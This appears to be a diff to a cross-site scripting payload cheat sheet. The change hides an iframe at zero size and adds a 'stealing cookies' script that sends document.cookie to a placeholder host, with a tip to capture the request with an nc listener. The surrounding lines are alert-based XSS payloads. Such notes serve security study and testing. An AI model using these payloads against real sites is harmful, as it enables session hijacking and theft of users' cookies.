@@ -10,9 +10,17 @@ Payloads
 <svg onload=alert(1)>
 ```
 
-iframe: `<iframe src="http://www.cnn.com"></iframe>`  
+iframe: `<iframe src="http://www.cnn.com" height = "0" width = "0"></iframe>`  
 Stored cookie: `<script>alert(document.cookie)</script>`  
-Reflected (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`
+Reflected (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`  
+Stealing cookies:  
+```
+<script>
+new Image().src="http://0.0.0.0/bogus.php?output="+document.cookie;
+</script>
+
+You can see the browser's request by setting up nc listener on port 80.
+```
 
 ```
 <body background="javascript:alert('running in background');">
